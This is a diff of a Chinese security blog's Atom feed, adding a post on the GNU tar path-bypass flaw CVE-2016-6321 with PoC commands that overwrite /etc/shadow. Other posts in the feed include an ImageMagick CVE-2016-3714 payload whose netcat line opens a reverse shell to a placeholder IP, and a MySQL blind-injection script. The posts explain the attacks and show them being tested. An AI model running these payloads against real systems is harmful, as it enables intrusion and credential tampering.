@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://wps2015.org/"/>
-  <updated>2016-10-28T08:27:57.748Z</updated>
+  <updated>2016-11-09T03:04:54.970Z</updated>
   <id>http://wps2015.org/</id>
   
   <author>
@@ -16,11 +16,61 @@
   <generator uri="http://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>Tar解压路径绕过漏洞分析（CVE-2016-6321）</title>
+    <link href="http://wps2015.org/2016/11/08/the-test-of-Tar-extract-pathname-bypass/"/>
+    <id>http://wps2015.org/2016/11/08/the-test-of-Tar-extract-pathname-bypass/</id>
+    <published>2016-11-07T16:00:00.000Z</published>
+    <updated>2016-11-09T03:04:54.970Z</updated>
+    
+    <content type="html"><![CDATA[<p>安全研究人员Harry Sintonen等发现了linux中利用tar解压时存在目录传送绕过漏洞，原始漏洞分析在<a href="https://sintonen.fi/advisories/tar-extract-pathname-bypass.txt" target="_blank" rel="external">此处</a></p>
+<h4 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h4><ul>
+<li>GNU tar 1.14 to 1.29 (包含1.29)</li>
+<li>Red Hat、Alpine Linux、Red Star OS等（任何使用GNU tar的linux）</li>
+</ul>
+<h4 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h4><p>利用tar指令在解压压缩包时，遇到文件名为<code>..</code>时，会将<code>..</code>及之前的目录结构去掉以使得文件名变得更加安全；并且使得剩下的文件名与解压目录成相对路径，但这同样会导致安全问题。</p>
+<h4 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h4><p>下载测试<a href="https://sintonen.fi/advisories/tar-poc.tar" target="_blank" rel="external">exp</a>，以root权限执行tar指令</p>
+<ul>
+<li>在根目录下解压，不指定解压文件<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/# tar xvf tar-poc.tar</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>可以发现<code>etc/mod/../</code>被删除后，在当前目录（根目录）下的相对地址为<code>etc/shadow</code>，从而得到解压后的绝对地址为<code>/etc/shadow</code>，导致shadow被覆盖了。<br><img src="https://img.alicdn.com/imgextra/i1/792076116/TB230wYbZeJ.eBjy0FiXXXqapXa_!!792076116.png" alt=""></p>
+<ul>
+<li>在任一目录下解压，不指定解压文件<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/home/wps2015# tar xvf tar-poc.tar</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>可以看到文件被解压到了当前目录下的<code>etc/shadow</code><br><img src="https://img.alicdn.com/imgextra/i4/792076116/TB2j3Q5czm2.eBjSZFtXXX56VXa_!!792076116.png" alt=""></p>
+<ul>
+<li>在任意目录下解压，指定解压目录”-C /“<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/home/wps2015# tar xvf tar-poc.tar -C /</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>可以看到<code>/etc/shadow</code>被覆盖成功<br><img src="https://img.alicdn.com/imgextra/i4/792076116/TB2IiE6cp5N.eBjSZFKXXX_QVXa_!!792076116.png" alt=""></p>
+<ul>
+<li>在任意目录下解压，指定解压文件<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/home/wps2015# tar xvf tar-poc.tar etc/motd/</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>指定解压文件也可以解压成功<br><img src="https://img.alicdn.com/imgextra/i4/792076116/TB2hwZYbY1K.eBjSsphXXcJOXXa_!!792076116.png" alt=""></p>
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>该漏洞需要满足较多条件，如需要较高权限（root），需要在指定目录下解压文件等。</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;安全研究人员Harry Sintonen等发现了linux中利用tar解压时存在目录传送绕过漏洞，原始漏洞分析在&lt;a href=&quot;https://sintonen.fi/advisories/tar-extract-pathname-bypass.txt&quot; target=&quot;
+    
+    </summary>
+    
+      <category term="漏洞分析" scheme="http://wps2015.org/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
+    
+    
+      <category term="linux" scheme="http://wps2015.org/tags/linux/"/>
+    
+  </entry>
+  
+  <entry>
     <title>解决Requests抓取中文网页乱码问题</title>
     <link href="http://wps2015.org/2016/10/28/how-to-requests-chinese-in-python/"/>
     <id>http://wps2015.org/2016/10/28/how-to-requests-chinese-in-python/</id>
     <published>2016-10-27T16:00:00.000Z</published>
-    <updated>2016-10-28T08:27:57.748Z</updated>
+    <updated>2016-11-08T01:47:54.552Z</updated>
     
     <content type="html"><![CDATA[<p>Requests是用Python语言编写，使用的是urllib3，拥有了它的所有特性，Requests 支持 HTTP 连接保持和连接池，支持使用 cookie 保持会话，支持文件上传，支持自动确定响应内容的编码，支持国际化的 URL 和 POST 数据自动编码。现代、国际化、人性化。正是由于它的强大，所以现在被广泛的用于爬虫等方面，但是在对中文网页进行抓取的时候，或多或少会遇到一些编码问题，本文就这些问题讨论一下。<a id="more"></a></p>
 <h4 id="简单demo"><a href="#简单demo" class="headerlink" title="简单demo"></a>简单demo</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">r = requests.get(<span class="string">"http://www.scusec.org"</span>)</span><br><span class="line"><span class="keyword">print</span> r.encoding       <span class="comment"># Requests推测使用的编码格式</span></span><br><span class="line"><span class="keyword">print</span> r.text           <span class="comment"># 字符串方式的响应体，会自动根据响应头部的字符编码进行解码</span></span><br><span class="line"><span class="keyword">print</span> r.content        <span class="comment"># 字节方式的响应体，会自动为你解码 gzip 和 deflate 压缩</span></span><br></pre></td></tr></table></figure>
@@ -52,7 +102,7 @@
     
     </summary>
     
-      <category term="编程" scheme="http://wps2015.org/categories/%E7%BC%96%E7%A8%8B/"/>
+      <category term="编程之美" scheme="http://wps2015.org/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E7%BE%8E/"/>
     
     
       <category term="python" scheme="http://wps2015.org/tags/python/"/>
@@ -216,13 +266,15 @@
   </entry>
   
   <entry>
-    <title>LNScan--一个高效的信息探测脚本</title>
+    <title></title>
     <link href="http://wps2015.org/2016/07/28/LNScan/"/>
     <id>http://wps2015.org/2016/07/28/LNScan/</id>
-    <published>2016-07-27T16:00:00.000Z</published>
-    <updated>2016-08-05T07:41:09.005Z</updated>
+    <published>2016-07-28T07:15:14.927Z</published>
+    <updated>2016-11-08T01:48:32.212Z</updated>
     
-    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>对于信息安全工作者，快速了解一个ip段、ip列表或者域名列表的信息（端口、标题、敏感文件等），是进行安全检测的重要一环，LNScan正是为此而生，敏感文件扫描模块改自<a href="https://github.com/lijiejie/BBScan" target="_blank" rel="external">BBScan</a>.<br><a id="more"></a></p>
+    <content type="html"><![CDATA[<hr>
+<p>title: LNScan–一个高效的信息探测脚本<br>tags: python<br>categories: 神器而已</p>
+<h2 id="date-2016-07-28"><a href="#date-2016-07-28" class="headerlink" title="date: 2016-07-28"></a>date: 2016-07-28</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>对于信息安全工作者，快速了解一个ip段、ip列表或者域名列表的信息（端口、标题、敏感文件等），是进行安全检测的重要一环，LNScan正是为此而生，敏感文件扫描模块改自<a href="https://github.com/lijiejie/BBScan" target="_blank" rel="external">BBScan</a>.<br><a id="more"></a></p>
 <h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><ul>
 <li>快速高效，多进程 + 多线程结合</li>
 <li>支持指定ip段，或者文件导入（ip/域名）</li>
@@ -231,7 +283,8 @@
 </ul>
 <p>扫描报告如下图：</p>
 <p><img src="https://img.alicdn.com/imgextra/i3/792076116/TB2SbKbtFXXXXaeXpXXXXXXXXXX_!!792076116.png" alt=""></p>
-<h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip段/文件 =&gt; title&amp;常见端口扫描 =&gt; 提取web端口 =&gt; 敏感文件扫描 =&gt; 生成report</span><br></pre></td></tr></table></figure>
+<h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><pre><code class="htm">ip段/文件 =&gt; title&amp;常见端口扫描 =&gt; 提取web端口 =&gt; 敏感文件扫描 =&gt; 生成report
+</code></pre>
 <h3 id="改进"><a href="#改进" class="headerlink" title="改进"></a>改进</h3><p>对一个大型的企业来说，使用layer等工具扫描二级域名，获取的ip/域名并不完全；若发现很多子域名分布在不同的C段，那么针对每个C段扫描就显得任务很重。本工具计划针对导入的ip/域名，进行人为的ip扩展（前后相邻ip或者利用掩码划分更小的段），更大限度的命中目标企业ip。</p>
 <hr>
 <p><strong>最新进展</strong></p>
@@ -243,14 +296,12 @@
     
     <summary type="html">
     
-      &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;对于信息安全工作者，快速了解一个ip段、ip列表或者域名列表的信息（端口、标题、敏感文件等），是进行安全检测的重要一环，LNScan正是为此而生，敏感文件扫描模块改自&lt;a href=&quot;https://github.com/lijiejie/BBScan&quot;&gt;BBScan&lt;/a&gt;.&lt;br&gt;
+      &lt;hr&gt;
+&lt;p&gt;title: LNScan–一个高效的信息探测脚本&lt;br&gt;tags: python&lt;br&gt;categories: 神器而已&lt;/p&gt;
+&lt;h2 id=&quot;date-2016-07-28&quot;&gt;&lt;a href=&quot;#date-2016-07-28&quot; class=&quot;headerlink&quot; title=&quot;date: 2016-07-28&quot;&gt;&lt;/a&gt;date: 2016-07-28&lt;/h2&gt;&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;对于信息安全工作者，快速了解一个ip段、ip列表或者域名列表的信息（端口、标题、敏感文件等），是进行安全检测的重要一环，LNScan正是为此而生，敏感文件扫描模块改自&lt;a href=&quot;https://github.com/lijiejie/BBScan&quot;&gt;BBScan&lt;/a&gt;.&lt;br&gt;
     
     </summary>
     
-      <category term="工具" scheme="http://wps2015.org/categories/%E5%B7%A5%E5%85%B7/"/>
-    
-    
-      <category term="python" scheme="http://wps2015.org/tags/python/"/>
     
   </entry>
   
@@ -372,7 +423,7 @@
     <link href="http://wps2015.org/2016/05/15/whctf-writeup-all/"/>
     <id>http://wps2015.org/2016/05/15/whctf-writeup-all/</id>
     <published>2016-05-14T16:00:00.000Z</published>
-    <updated>2016-05-16T08:10:46.792Z</updated>
+    <updated>2016-11-08T01:44:24.472Z</updated>
     
     <content type="html"><![CDATA[<p>whctf2016初赛提前结束了，团队的小伙伴们还是很给力的，做出了所有的web及几乎所有（差一道）的crypto题。</p>
 <h2 id="Web题"><a href="#Web题" class="headerlink" title="Web题"></a>Web题<a id="more"></a></h2><p><strong>0x01. 信息</strong></p>
@@ -404,7 +455,7 @@
     
     </summary>
     
-      <category term="ctf相关" scheme="http://wps2015.org/categories/ctf%E7%9B%B8%E5%85%B3/"/>
+      <category term="CTF" scheme="http://wps2015.org/categories/CTF/"/>
     
     
       <category term="ctf" scheme="http://wps2015.org/tags/ctf/"/>
@@ -416,7 +467,7 @@
     <link href="http://wps2015.org/2016/05/12/Using-phantomjs%20+%20selenium-fetching-js-result-of-execution/"/>
     <id>http://wps2015.org/2016/05/12/Using-phantomjs + selenium-fetching-js-result-of-execution/</id>
     <published>2016-05-12T02:29:30.603Z</published>
-    <updated>2016-05-12T07:44:28.859Z</updated>
+    <updated>2016-11-08T01:46:28.707Z</updated>
     
     <content type="html"><![CDATA[<p>0x01 问题需求<br>有需要写一个接口需要可以抓取360webscan的网站评分及漏洞情况，本来以为一个简单的爬虫就能搞定的。哪想到把网页抓下来后一下子就懵逼了，先看获取分数的地方<a id="more"></a><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$.ajax(&#123;  	</span><br><span class="line"></span><br><span class="line">				url : <span class="string">"/webscore/index"</span>,</span><br><span class="line"></span><br><span class="line">				type: <span class="string">'POST'</span>,</span><br><span class="line"></span><br><span class="line">				dataType:  <span class="string">'json'</span>,</span><br><span class="line"></span><br><span class="line">				data:<span class="string">'isxujia='</span>+isxujia+<span class="string">'&amp;iscuangai='</span>+iscuangai+<span class="string">'&amp;isviolation='</span>+isviolation+<span class="string">'&amp;isguama='</span>+isguama+<span class="string">'&amp;high='</span>+high+<span class="string">'&amp;mid='</span>+mid+<span class="string">'&amp;low='</span>+low+<span class="string">'&amp;info='</span>+info+<span class="string">'&amp;domain=www.natco.top&amp;pangzhu='</span>+pangzhu,</span><br><span class="line"></span><br><span class="line">				success: <span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br></pre></td></tr></table></figure></p>
 <p>先看这一段ajax请求，把url的参数连同isxujia（是否虚假）等参数向服务器请求后，获取得分。那么isxujia等参数从哪里来？再往上看<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$.ajax(&#123;</span><br><span class="line"></span><br><span class="line">			  url: <span class="string">"/index/gettrojan"</span>,</span><br><span class="line"></span><br><span class="line">			  type:<span class="string">"POST"</span>,</span><br><span class="line"></span><br><span class="line">			  dataType:<span class="string">"json"</span>,</span><br><span class="line"></span><br><span class="line">			  data:<span class="string">"url="</span>+url+<span class="string">"&amp;token=34e08ea449361738107148de883678c4&amp;time=1462934864"</span>,</span><br><span class="line"></span><br><span class="line">			  success: <span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;	</span><br><span class="line"></span><br><span class="line">			        <span class="keyword">var</span> type = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">					<span class="keyword">var</span> st = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">					<span class="keyword">var</span> sc = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">					<span class="keyword">var</span> ssc = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">					<span class="keyword">var</span> trojan_list = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">					<span class="keyword">var</span> isxujia = <span class="number">0</span>;</span><br></pre></td></tr></table></figure></p>
@@ -434,7 +485,7 @@
     
     </summary>
     
-      <category term="编程" scheme="http://wps2015.org/categories/%E7%BC%96%E7%A8%8B/"/>
+      <category term="编程之美" scheme="http://wps2015.org/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E7%BE%8E/"/>
     
     
       <category term="python" scheme="http://wps2015.org/tags/python/"/>
@@ -446,7 +497,7 @@
     <link href="http://wps2015.org/2016/05/12/test-of-ImageMagick%7F/"/>
     <id>http://wps2015.org/2016/05/12/test-of-ImageMagick/</id>
     <published>2016-05-11T16:00:00.000Z</published>
-    <updated>2016-05-15T12:40:07.280Z</updated>
+    <updated>2016-11-08T01:44:57.891Z</updated>
     
     <content type="html"><![CDATA[<p>&emsp;&emsp;5月3日，图像处理软件ImageMagick就被公布出一个严重的0day漏洞(CVE-2016-3714)，攻击者通过此漏洞可执行任意命令，最终窃取重要信息取得服务器控制权。<a id="more"></a>由此漏洞延伸，ImageMagick被许多编程语言所支持，包括Perl，C++，PHP（通过imagick拓展），Python和Ruby等，并被部署在数以百万计的网站，博客，社交媒体平台和流行的内容管理系统(CMS)，例如WordPress和Drupal。<br>&emsp;&emsp;利用这个漏洞，可以通过上传一张含有恶意代码的图片，可导致命令执行。这里我们主要讲的是如何测试漏洞，可以写文件、反弹shell、wget等。本地搭建一个测试环境，在kali2.0中，lamp环境下，安装了php的imagick扩展，调用ImageMagick进行上传的图片处理<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> ($_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>]&gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Error: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] . <span class="string">""</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>];</span><br><span class="line">    $dest_file = <span class="string">"./images/"</span>.md5(uniqid(rand())).<span class="string">".png"</span>;</span><br><span class="line">    $thumb = <span class="keyword">new</span> Imagick();</span><br><span class="line">    $thumb-&gt;readImage($temp_file);</span><br><span class="line">    $thumb-&gt;writeImage($dest_file);</span><br><span class="line">    $thumb-&gt;clear();</span><br><span class="line">    $thumb-&gt;destroy();</span><br><span class="line">    unlink($temp_file);</span><br><span class="line">    <span class="keyword">echo</span> $dest_file;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
 <p><strong>1. netcat</strong><br>前提是server服务器上安装了netcat，poc如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill &apos;url(https://example.com/image.jpg&quot;|nc xxx.xxx.xxx.xxx 2015 -e /bin/bash&quot;)&apos;</span><br><span class="line">pop graphic-context</span><br></pre></td></tr></table></figure></p>
@@ -465,7 +516,7 @@
     
     </summary>
     
-      <category term="Web安全" scheme="http://wps2015.org/categories/Web%E5%AE%89%E5%85%A8/"/>
+      <category term="漏洞分析" scheme="http://wps2015.org/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
     
     
       <category term="poc" scheme="http://wps2015.org/tags/poc/"/>
@@ -477,7 +528,7 @@
     <link href="http://wps2015.org/2016/03/07/a-simple-discuss-of-enterprise-local-network/"/>
     <id>http://wps2015.org/2016/03/07/a-simple-discuss-of-enterprise-local-network/</id>
     <published>2016-03-06T16:00:00.000Z</published>
-    <updated>2016-05-15T12:40:15.291Z</updated>
+    <updated>2016-11-08T01:44:46.748Z</updated>
     
     <content type="html"><![CDATA[<h2 id="0x01-企业网络边界"><a href="#0x01-企业网络边界" class="headerlink" title="0x01 企业网络边界"></a>0x01 企业网络边界</h2><p>&emsp;&emsp;我们知道既然要从外围进入内网，那么必然要做的一件事情就是跨越边界，所有这个命门我们也就自然应该在企业的内外网边界上来寻找。<a id="more"></a><br>&emsp;&emsp;那为什么企业需要在内外网之间部署这样一个边界呢？我们只要作为一个大企业来说他会有上百甚至上千个业务线，而安全团队或许只有几十人，那这几十人要保证这上千个业务线的安全，显然如果用布点的方式肯定无法完成覆盖的，所以企业在思考如何进行防御的时候会选择区域性防守。<br>&emsp;&emsp;所谓区域性防守就是把重点需要保护的业务&amp;数据放到一个指定的区域，让后对这个区域进行隔离，并指定好进入这个区域的防火墙策略。然后定期对这个区域进行安全检查。<br>&emsp;&emsp;如果这样实施的很好，看起来一切都很完美。但是事实上并不尽人意，事实是这样的，在企业内部通常业务部门是会比安全部门强势的，这一点我相信大家都知道，那么就会导致一个问题，安全部门总想着把业务圈起来，各种严格的策略和规范实施上去，而业务部门在业务快速迭代的背景下就会很难去严格执行你的策略。他们会要求你针对他特殊的业务场景来制定专门的策略，甚至部署到非隔离区域，而且这样的情况不在少数。如此一来安全部门需要维护的策略和规范就会越来越多。而这将直接导致策略及规范的执行越来越差。</p>
 <h2 id="0x02-合法的入口"><a href="#0x02-合法的入口" class="headerlink" title="0x02 合法的入口"></a>0x02 合法的入口</h2><h3 id="1-物理接触"><a href="#1-物理接触" class="headerlink" title="1. 物理接触"></a>1. 物理接触</h3><p>&emsp;&emsp;如果你能直接物理接触公司内网（插网线或者连接wifi），我只能说你牛B。案例：</p>
@@ -546,7 +597,7 @@
     
     </summary>
     
-      <category term="渗透测试" scheme="http://wps2015.org/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+      <category term="Web安全" scheme="http://wps2015.org/categories/Web%E5%AE%89%E5%85%A8/"/>
     
     
       <category term="内网" scheme="http://wps2015.org/tags/%E5%86%85%E7%BD%91/"/>
@@ -558,7 +609,7 @@
     <link href="http://wps2015.org/2016/03/02/Network-infiltration-socks5-agency/"/>
     <id>http://wps2015.org/2016/03/02/Network-infiltration-socks5-agency/</id>
     <published>2016-03-02T08:48:10.000Z</published>
-    <updated>2016-07-28T07:20:27.102Z</updated>
+    <updated>2016-11-08T01:44:03.534Z</updated>
     
     <content type="html"><![CDATA[<h3 id="1-首先我们需要明白正向代理和反向代理的区别"><a href="#1-首先我们需要明白正向代理和反向代理的区别" class="headerlink" title="1. 首先我们需要明白正向代理和反向代理的区别"></a>1. 首先我们需要明白正向代理和反向代理的区别</h3><p><strong>1.1 正向代理(Forward Proxy)</strong></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Lhost－－&gt;proxy－－&gt;Rhost</span><br></pre></td></tr></table></figure>
@@ -593,7 +644,7 @@
     
     </summary>
     
-      <category term="工具" scheme="http://wps2015.org/categories/%E5%B7%A5%E5%85%B7/"/>
+      <category term="神器而已" scheme="http://wps2015.org/categories/%E7%A5%9E%E5%99%A8%E8%80%8C%E5%B7%B2/"/>
     
     
       <category term="内网" scheme="http://wps2015.org/tags/%E5%86%85%E7%BD%91/"/>
@@ -605,7 +656,7 @@
     <link href="http://wps2015.org/2015/09/29/the-unsafe-factors-of-host-binding/"/>
     <id>http://wps2015.org/2015/09/29/the-unsafe-factors-of-host-binding/</id>
     <published>2015-09-29T08:24:59.000Z</published>
-    <updated>2016-05-15T12:32:04.508Z</updated>
+    <updated>2016-11-08T01:46:57.610Z</updated>
     
     <content type="html"><![CDATA[<p><strong>1、host主机头</strong><br>host主机头绑定是很多网站常用的一种一机多站的实现方法,相对于使用不同端口来实现一机多站要安全许多,因为端口可以通过暴力手段找到,而host绑定就要难破解很多,因为需要IP和主机名的对应.<a id="more"></a></p>
 <p><strong>2、漏洞成因及危害</strong><br>很多网站为了方便管理和节省服务器成本,将内网管理站点和外网站点放置在同一服务器下,使用一机多站来进行隔离.</p>
@@ -633,7 +684,7 @@
     
     </summary>
     
-      <category term="Web安全" scheme="http://wps2015.org/categories/Web%E5%AE%89%E5%85%A8/"/>
+      <category term="其他安全" scheme="http://wps2015.org/categories/%E5%85%B6%E4%BB%96%E5%AE%89%E5%85%A8/"/>
     
     
       <category term="host" scheme="http://wps2015.org/tags/host/"/>
@@ -645,7 +696,7 @@
     <link href="http://wps2015.org/2015/07/15/script-of-mysql-boolen-based/"/>
     <id>http://wps2015.org/2015/07/15/script-of-mysql-boolen-based/</id>
     <published>2015-07-15T14:00:44.000Z</published>
-    <updated>2016-05-15T12:35:01.046Z</updated>
+    <updated>2016-11-08T01:45:14.089Z</updated>
     
     <content type="html"><![CDATA[<p>当某个盲注点不能使用工具（一般有waf限制）的时候，可以使用这个脚本用于证明漏洞的存在<a id="more"></a></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#! usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">import httplib</span><br><span class="line">import time</span><br><span class="line">import string</span><br><span class="line">import sys</span><br><span class="line">import random</span><br><span class="line">import urllib</span><br><span class="line"></span><br><span class="line">headers = &#123;&apos;User-Agent&apos;: &apos;Mozilla/5.0 Chrome/28.0.1500.63&apos;,&#125;</span><br><span class="line">payloads = list(&apos;abcdefghijklmnopqrstuvwxyz0123456789@_.&apos;)</span><br><span class="line">print &apos;start to retrive MySQL user:&apos;</span><br><span class="line">user = &apos;&apos;</span><br><span class="line">for i in range(1,21):</span><br><span class="line">	for payload in payloads:</span><br><span class="line">		conn = httplib.HTTPConnection(&apos;www.example.com&apos;, timeout=4)      #连接,host</span><br><span class="line">		s = &quot;ascii(mid(lower(user()),%s,1))=%s&quot; % (i, ord(payload))       #payload</span><br><span class="line">		conn.request(method=&apos;GET&apos;,url=&quot;/php/1.php?id=1 and %s&quot; % s,headers = headers)  #url</span><br><span class="line">		html_header= conn.getresponse().read()</span><br><span class="line">		length=len(html_header)</span><br><span class="line">		if length&gt;10000:</span><br><span class="line">			user+=payload</span><br><span class="line">			sys.stdout.write(&apos;\r[In progress] %s&apos; % user)</span><br><span class="line">			sys.stdout.flush()</span><br><span class="line">			break</span><br><span class="line">		else:</span><br><span class="line">			print &apos;.&apos;,</span><br><span class="line">			conn.close()</span><br><span class="line"></span><br><span class="line">print &apos;\n[Done]MySQL user is&apos;, user</span><br></pre></td></tr></table></figure>
@@ -657,7 +708,7 @@
     
     </summary>
     
-      <category term="渗透测试" scheme="http://wps2015.org/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+      <category term="Web安全" scheme="http://wps2015.org/categories/Web%E5%AE%89%E5%85%A8/"/>
     
     
       <category term="python" scheme="http://wps2015.org/tags/python/"/>
@@ -669,7 +720,7 @@
     <link href="http://wps2015.org/2015/07/13/DNS-domain-and-the-exploit/"/>
     <id>http://wps2015.org/2015/07/13/DNS-domain-and-the-exploit/</id>
     <published>2015-07-13T03:10:37.000Z</published>
-    <updated>2016-05-15T12:32:47.829Z</updated>
+    <updated>2016-11-08T01:47:09.076Z</updated>
     
     <content type="html"><![CDATA[<p>其实利用方法分为手工和工具两种，我们可以利用BT5下面的工具Dnsenum或者是其它工具，手工的话就利用nslookup即可。<a id="more"></a></p>
 <p><strong>1、使用工具来获取DNS信息</strong></p>
@@ -692,7 +743,7 @@
     
     </summary>
     
-      <category term="Web安全" scheme="http://wps2015.org/categories/Web%E5%AE%89%E5%85%A8/"/>
+      <category term="其他安全" scheme="http://wps2015.org/categories/%E5%85%B6%E4%BB%96%E5%AE%89%E5%85%A8/"/>
     
     
       <category term="DNS" scheme="http://wps2015.org/tags/DNS/"/>
@@ -704,7 +755,7 @@
     <link href="http://wps2015.org/2015/06/18/the-problem-of-python-chinese/"/>
     <id>http://wps2015.org/2015/06/18/the-problem-of-python-chinese/</id>
     <published>2015-06-18T02:14:26.000Z</published>
-    <updated>2016-05-15T12:34:08.251Z</updated>
+    <updated>2016-11-08T01:45:23.348Z</updated>
     
     <content type="html"><![CDATA[<p>&emsp;&emsp;如题，其实我的问题很简单，就是在写爬虫的时候拿到网页的信息包含类似”\u65b0\u6d6a\u5fae\u535a\u6ce8\u518c”的字符串，实际上这是unicode的中文编码，对应的中文为“新浪微博注册”。其实我就是想找一个函数让这一串东西显示中文而已，没想到百度了白天找到合适的。<a id="more"></a>遇到这种问题千万不要用什么 “python编码” “unicode中文编码” “unicode解码”这样的关键字去搜，一大堆网页出来毫不相关。<br>&emsp;&emsp;其实这个问题一个函数搞定，如下：<br>Example 1:<br>&gt;&gt;&gt; s = r”\u65b0\u6d6a\u5fae\u535a\u6ce8\u518c”<br>&gt;&gt;&gt; s<br>‘\u65b0\u6d6a\u5fae\u535a\u6ce8\u518c’<br>&gt;&gt;&gt; print s<br>\u65b0\u6d6a\u5fae\u535a\u6ce8\u518c<br>&gt;&gt;&gt; s = s.decode(“unicode_escape”); #就是这个函数<br>&gt;&gt;&gt; print s</p>
